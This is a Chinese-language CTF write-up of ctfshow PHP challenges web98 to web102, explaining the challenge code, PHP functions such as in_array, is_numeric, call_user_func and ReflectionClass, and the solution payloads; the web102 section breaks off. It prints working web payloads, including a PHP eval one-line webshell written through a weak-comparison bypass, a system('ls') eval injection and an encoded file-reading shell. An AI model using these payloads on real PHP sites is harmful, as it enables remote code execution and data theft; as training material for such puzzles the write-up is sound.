<h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><em>$GET?$GET&#x3D;&amp;$_POST:’flag’–$_GET 变量是一个数组，内容是 GET 方法发送的变量名称和值，类似于字典。 如果 $_GET 变量不为空，则 $_GET 变量和 $_POST 变量指向同一个地址，即$_POST 变量内容会影响 $_GET 变量的内容。 如果 $_GET 变量为空，整个三元表达式的结果为 ’flag’。</em></p>
<p>$_GET[‘flag’]&#x3D;&#x3D;’flag’?$_GET&#x3D;&amp;$_COOKIE:’flag’;–如果 flag 变量值为 ’flag’，则 $_GET 变量和 $_COOKIE 变量指向同一个地址； 否则返回flag.</p>
<p>$_GET[‘flag’]&#x3D;&#x3D;’flag’?$_GET&#x3D;&amp;$_SERVER:’flag’;–如果flag变量值为’flag’，则 $_GET 变量和 $_SERVER 变量指向同一个地址； 否则返回flag。</p>
<p>highlight_file($_GET[‘HTTP_FLAG’]&#x3D;&#x3D;’flag’?$flag:<strong>FILE</strong>);–如果 HTTP_FLAG 变量值为 ’flag’，输出 $flag，否则输出当前文件。</p>
<p>知识点</p>
<h3 id="1、if-语句简写"><a href="#1、if-语句简写" class="headerlink" title="1、if 语句简写"></a>1、<strong>if 语句简写</strong></h3><h4 id="（1）执行单条语句"><a href="#（1）执行单条语句" class="headerlink" title="（1）执行单条语句"></a>（1）执行单条语句</h4><h4 id="（2）三目运算符"><a href="#（2）三目运算符" class="headerlink" title="（2）三目运算符"></a>（2）三目运算符</h4><p>　　　　　　格式：条件? 语句1: 语句2（条件为真，执行语句1；条件为假，执行语句2）</p>
<p>　　　　　　if 语句格式 if(条件){语句1}else{语句2}</p>
<h4 id="（3）符号"><a href="#（3）符号" class="headerlink" title="（3）符号 || &amp;&amp;"></a>（3）符号 || &amp;&amp;</h4><h3 id="2、预定义变量"><a href="#2、预定义变量" class="headerlink" title="2、预定义变量"></a>2、<strong>预定义变量</strong></h3><p>　　　　预定义变量都是关联数组类型</p>
<p>　　　　（1）服务器变量：$_SERVER</p>
<p>　　　　（2）HTTP GET变量：$_GET</p>
<p>　　　　（3）HTTP POST变量：$_POST</p>
<p>　　　　（4）HTTP cookies：$_COOKIE</p>
<p>解题方法</p>
<p>让$_GET[‘HTTP_FLAG’]&#x3D;&#x3D;’flag’，我们就应该用第一行的方法</p>
<p>先GET传参随便传一个然后再POST传参HTTP_FLAG&#x3D;flag</p>
<p>payload:</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get</span>   <span class="attribute">flag</span>=a</span><br><span class="line">post  <span class="attribute">HTTP_FLAG</span>=flag</span><br></pre></td></tr></table></figure>

<h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>先审一下代码：</p>
<p>$allow &#x3D; array();–创建了一个空数组 $allow，用来存储后续生成的随机数。</p>
<p><strong>array_push</strong>($allow, <strong>rand</strong>(1, $i))代码解释</p>
<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><h4 id="rand-函数"><a href="#rand-函数" class="headerlink" title="rand()函数"></a>rand()函数</h4><ul>
<li><code>rand()</code> 函数<ul>
<li>这是 PHP 中的一个内置函数，用于生成一个随机整数。</li>
<li>语法为 <code>**rand(int $min, int $max)**</code>，其中 <code>$min</code> 是生成随机数的下限，<code>$max</code> 是上限。</li>
<li>在这里，<code>rand(1, $i)</code> 会生成一个介于 1 和 <code>$i</code>（当前循环迭代中的值）之间的随机整数。</li>
</ul>
</li>
</ul>
<h4 id="array-push-函数"><a href="#array-push-函数" class="headerlink" title="array_push()函数"></a><code>array_push()</code>函数</h4><ul>
<li><code>array_push()</code> 函数<ul>
<li>这是 PHP 中用于向数组末尾添加一个或多个元素的函数。</li>
<li>语法为 <code>array_push(array &amp;$array, mixed ...$values)</code>，其中 <code>$array</code> 是要添加元素的数组，<code>$values</code> 是一个或多个要添加的值。</li>
<li>在这里，<code>$allow</code> 是目标数组，而 <code>rand(1, $i)</code> 生成的随机数就是要添加的值。</li>
</ul>
</li>
</ul>
<h4 id="in-array-函数"><a href="#in-array-函数" class="headerlink" title="in_array() 函数"></a><code>in_array()</code> 函数</h4><ul>
<li><p>这是 PHP 的一个内置函数，用于检查指定的值是否存在于数组中。</p>
</li>
<li><p>语法是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="keyword">mixed</span> <span class="variable">$needle</span>, <span class="keyword">array</span> <span class="variable">$haystack</span>, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>$needle</code></strong>: 要搜索的值（在这个例子中是 <code>$_GET[&#39;n&#39;]</code>）。</li>
<li><strong><code>$haystack</code></strong>: 要搜索的数组（在这个例子中是 <code>$allow</code>）。</li>
<li>**<code>$strict</code>**（可选）：如果为 <code>true</code>，则在比较时会进行类型检查。</li>
</ul>
</li>
</ul>
<p>注:in_array()函数默认采用的是弱比较，在进行检查比较的时候回自动进行类型转换，我们来验证一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$a</span>,<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">#输出结果是yes，证明1和1.php是相等的，即通过了弱比较  </span></span><br></pre></td></tr></table></figure>

<p><strong>in_array() 函数存在弱比较的漏洞，如果没有设置第三个参数，in_array()  函数在比较时默认是弱类型比较，这意味着它会进行自动类型转换。例如数组中的元素是整数，而搜索的值是字符串，PHP  会尝试将字符串转换为整数来进行比较。比如上面字符串类型的 1.php 就自动转换为了整数 1，也就符合在数组中的条件。</strong></p>
<h4 id="file-put-contents-函数"><a href="#file-put-contents-函数" class="headerlink" title="file_put_contents()函数"></a><code>file_put_contents()</code>函数</h4><ul>
<li><p>这是 PHP 的一个内置函数，用于将字符串写入文件。如果文件不存在，它会创建一个新文件；如果文件已存在，它会覆盖原文件的内容。</p>
</li>
<li><p>语法为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">string</span> <span class="variable">$filename</span>, <span class="keyword">mixed</span> <span class="variable">$data</span>, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span>, resource <span class="variable">$context</span> = <span class="literal">null</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>$filename</code></strong>: 要写入的文件名，通常是包含路径的字符串。</li>
<li><strong><code>$data</code></strong>: 要写入文件的内容，可以是字符串。</li>
<li>**<code>$flags</code>**（可选）：可以使用的标志，例如 <code>FILE_APPEND</code> 来附加内容。</li>
<li>**<code>$context</code>**（可选）：文件句柄的上下文</li>
</ul>
<p>记住，我们也可以通过伪协议将文件名写入</p>
</li>
</ul>
<p>返回来看题目</p>
<p>已知for循环里面的i初始值为36，那么数组中必然存在1-36之间的数，所以这时候我们可以猜测其中的数字</p>
<p>因为我们知道了in_array()是弱比较类型，所以我们可以直接构造数字+文件名去绕过验证</p>
<p>payload:</p>
<p><code>?n=1.php</code>	我个人觉得1的概率是最大了</p>
<p><code>content=&lt;?php eval($_POST[1]);?&gt;</code></p>
<p>分别用get和post传入参数</p>
<p>之后访问1.php，再往一句话木马参数中传入命令或者用蚁剑进行连接，就可以拿到flag了</p>
<h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看到提示flag在class ctfshow中，那就访问看看，发现什么都没有</p>
<p>解析代码</p>
<h4 id="is-numeric-函数"><a href="#is-numeric-函数" class="headerlink" title="is_numeric()函数"></a>is_numeric()函数</h4><p><code>is_numeric()</code> 函数用于检测一个变量是否为数字或数字字符串这个函数返回一个布尔值：如果变量是数字或可以被转换为数字的字符串，则返回 <code>true</code>，否则返回 <code>false</code>。</p>
<p>函数原型</p>
<p><code>bool is_numeric(mixed $var)</code></p>
<p>举个例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 示例 1: 整数</span></span><br><span class="line"><span class="variable">$var1</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$var1</span>) ? <span class="string">&#x27;true&#x27;</span> : <span class="string">&#x27;false&#x27;</span>; <span class="comment">// 输出: true</span></span><br><span class="line"><span class="comment">// 示例 2: 浮点数</span></span><br><span class="line"><span class="variable">$var2</span> = <span class="number">123.45</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$var2</span>) ? <span class="string">&#x27;true&#x27;</span> : <span class="string">&#x27;false&#x27;</span>; <span class="comment">// 输出: true</span></span><br><span class="line"><span class="comment">// 示例 3: 数字字符串</span></span><br><span class="line"><span class="variable">$var3</span> = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$var3</span>) ? <span class="string">&#x27;true&#x27;</span> : <span class="string">&#x27;false&#x27;</span>; <span class="comment">// 输出: true</span></span><br></pre></td></tr></table></figure>

<p>$v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3)</p>
<ul>
<li>这里是为了检查这三个变量是否都为数字或者数字字符串，并将结果存储在变量 <code>$v0</code> 中，如果三个布尔值为true，v0才会为true</li>
</ul>
<p>v0为true，进入if嵌套判断，要求v2不能包含；但v3得有；，最后执行eval语句</p>
<p>但是这里要注意一个点:</p>
<h4 id="运算符优先极"><a href="#运算符优先极" class="headerlink" title="运算符优先极"></a>运算符优先极</h4><p>v0赋值，赋值<code>=</code>的优先级高于逻辑运算。所以只要让is_numeric($v1)返回true即可满足if判断，所以v2和v3不需要为数字</p>
<p>解题:</p>
<p>对于v1：题目中v1没什么用处，所以v1直接设置一个数字或者数字字符串就可以了</p>
<p>v1&#x3D;1</p>
<p>对于v2：在题目中可以看到后面有很多字符串，但当时没想到怎么利用这些字符串，就想着把后面的注释掉</p>
<p>v2&#x3D;var_dump($ctfshow)&#x2F;*—这里加上(&#x2F;*)就是为了注释掉，这里也可以用其他输出函数，或者用正常的命令执行函数也可以</p>
<p>对于v3：因为v3需要闭合哪个注释符号，还需要带分号</p>
<p>v3&#x3D;*&#x2F;;</p>
<p>将这三个参数传入</p>
<p>payload:</p>
<p>?v1&#x3D;1&amp;v2&#x3D;system(‘ls’)&#x2F;*<em>&amp;v3&#x3D;*</em>&#x2F;;</p>
<p>然后查看ctfshow.php</p>
<p>需要将 0x2d 替换为 - ，结果再使用 ctfshow{} 包裹。</p>
<h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>跟上题一样，但过滤了很多字符，这里的话我们先用脚本看一下有哪些字符是没有被过滤的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">32</span>;<span class="variable">$i</span>&lt;<span class="number">127</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>,<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#输出结果</span></span><br><span class="line"><span class="comment"># &amp; ( : &lt; &gt; A B C D E F G H I J K L M N O P Q R S T U V W X Y Z ] a b c d e f g h i j k l m n o p q r s t u v w x y z | &#125;</span></span><br></pre></td></tr></table></figure>

<p>这里的话正常的命令函数是用不了了的，我一开始也没什么头绪，所以果断去看wp</p>
<h3 id="利用反射类查看类"><a href="#利用反射类查看类" class="headerlink" title="利用反射类查看类"></a>利用反射类查看类</h3><h4 id="反射类：-ReflectionClass"><a href="#反射类：-ReflectionClass" class="headerlink" title="反射类： ReflectionClass"></a>反射类： ReflectionClass</h4><p><code>ReflectionClass</code> 是 PHP 反射 API 中的一个类，专门用于对类的结构进行反射。通过 <code>ReflectionClass</code>，开发者可以在运行时获取有关类的详细信息，例如类的名称、方法、属性、常量等。它允许动态访问类的特性，从而使得程序能够更灵活地处理对象。</p>
<p>用法:创建一个 ReflectionClass 实例</p>
<p><code>$reflection = **new** **ReflectionClass**(&#39;ClassName&#39;);</code></p>
<h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><ol>
<li><strong>获取类的信息</strong><ul>
<li><code>getName()</code>: 获取类的名称。</li>
<li><code>getShortName()</code>: 获取类的短名称（不包含命名空间）。</li>
<li><code>getNamespaceName()</code>: 获取类的命名空间。</li>
<li><code>getParentClass()</code>: 获取父类的反射对象（如果没有父类，则返回 <code>false</code>）。</li>
<li><code>getInterfaces()</code>: 获取类实现的所有接口。</li>
</ul>
</li>
<li><strong>获取类的属性</strong><ul>
<li><code>getProperties()</code>: 获取类的所有属性，返回一个 <code>ReflectionProperty</code> 对象数组。</li>
<li><code>getProperty($name)</code>: 获取指定名称的属性的反射对象。</li>
</ul>
</li>
<li><strong>获取类的方法</strong><ul>
<li><code>getMethods()</code>: 获取类的所有方法，返回一个 <code>ReflectionMethod</code> 对象数组。</li>
<li><code>getMethod($name)</code>: 获取指定名称的方法的反射对象。</li>
</ul>
</li>
<li><strong>获取类的常量</strong><ul>
<li><code>getConstants()</code>: 获取类的所有常量。</li>
</ul>
</li>
<li><strong>创建类的实例</strong><ul>
<li><code>newInstance()</code>: 创建类的实例。</li>
<li><code>newInstanceArgs(array $args)</code>: 使用参数创建类的实例。</li>
</ul>
</li>
<li><strong>检查可见性</strong><ul>
<li><code>isInstantiable()</code>: 检查类是否可以被实例化。</li>
<li><code>isAbstract()</code>: 检查类是否为抽象类。</li>
<li><code>isFinal()</code>: 检查类是否为最终类。</li>
</ul>
</li>
</ol>
<p>payload：v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;</p>
<p>输入后就可以拿到flag，把0x2d换成-就可以，但注意这里flag少了一位需要爆破才能拿到</p>
<h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们只介绍新的知识点</p>
<h3 id="相关函数-1"><a href="#相关函数-1" class="headerlink" title="相关函数"></a>相关函数</h3><h4 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr() 函数"></a><code>substr()</code> 函数</h4><p>是 PHP 中用于提取字符串子部分的一个非常有用的函数。它可以从指定的位置开始提取字符串的部分内容，并且可以选择性地指定提取的长度。</p>
<p><code>substr()</code> 函数的基本语法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">substr</span>(<span class="keyword">string</span> <span class="variable">$string</span>, <span class="keyword">int</span> <span class="variable">$start</span>, <span class="keyword">int</span> <span class="variable">$length</span> = <span class="literal">null</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>$string</code></strong>: 要提取子字符串的原始字符串。</li>
<li><strong><code>$start</code></strong>: 开始提取的起始位置（以 0 开始计数）。如果为负数，则表示从字符串末尾开始的偏移量。</li>
<li><strong><code>$length</code></strong>: 提取的子字符串的长度（可选）。如果省略，<code>substr()</code> 将提取到字符串的末尾。如果为负数，则表示从提取的末尾开始的长度。</li>
</ul>
<h4 id="call-user-func-函数"><a href="#call-user-func-函数" class="headerlink" title="call_user_func()函数"></a>call_user_func()函数</h4><p>call_user_func() 调用方法或变量,第一个参数是调用的对象，第二个参数是被调用对象的参数</p>
<p>call_user_func()函数的基本语法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> ...<span class="variable">$parameters</span>)</span><br></pre></td></tr></table></figure>

<p>参数说明</p>
<ul>
<li><strong><code>$callback</code></strong>: 要调用的函数名、方法名或者是一个包含对象和方法名的数组。可以是字符串、数组（对象和方法名）或匿名函数。</li>
<li><strong><code>$parameters</code></strong>: 传递给回调函数的参数，可以是一个或多个参数。使用可变参数（…）的方式可以传递任意数量的参数。</li>
</ul>
<p>代码审计:</p>
<p>$s &#x3D; substr($v2,2);–从$v2的第二个字符开始截取字符串赋值给$s</p>
<p>$str &#x3D; call_user_func($v1,$s);–调用v1指定的函数，然后将s作为参数传递给函数，并将函数的返回值赋值给str</p>
<p>file_put_contents($v3,$str);–将str写入v3指定的文件中</p>
<p>解题:</p>
<p>这里要求v2必须为数字或者数字字符串，而且还会将v2从第三位数字开始截取并作为参数进入v1函数，而后将形成的payload写入v3文件中</p>
<p>如果v2必须为数字且v2得包含shell的话，就应该对v2的shell进行编码了</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&lt;?=`cat *`;&#x27;</span>; <span class="comment">// 定义一个字符串，包含 PHP 的短标签和一个 shell 命令</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>); <span class="comment">// 将字符串进行 Base64 编码</span></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$b</span>); <span class="comment">// 将 Base64 编码后的字符串转换为十六进制格式</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>; <span class="comment">// 输出十六进制字符串</span></span><br></pre></td></tr></table></figure>

<p>这里的话对v2的basse64编码后的字符串进行了二进制转化，所以我们的外围函数v1应该是一个可以进行解码的函数，所以我们v1设为hex2bin，但是当我们的shell进行base64编码后，发现多出了一个等于号，我们得把他去掉，不然在进行hex解码的时候末尾会出现3d，去掉不会对结果造成影响</p>
<h4 id="hex2bin-函数"><a href="#hex2bin-函数" class="headerlink" title="hex2bin()函数"></a>hex2bin()函数</h4><p><code>hex2bin()</code> 是 PHP 中的一个函数，用于将十六进制字符串转换为二进制字符串</p>
<p><code>hex2bin()</code> 的基本语法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">hex2bin</span>(<span class="keyword">string</span> <span class="variable">$hex_string</span>)</span><br></pre></td></tr></table></figure>

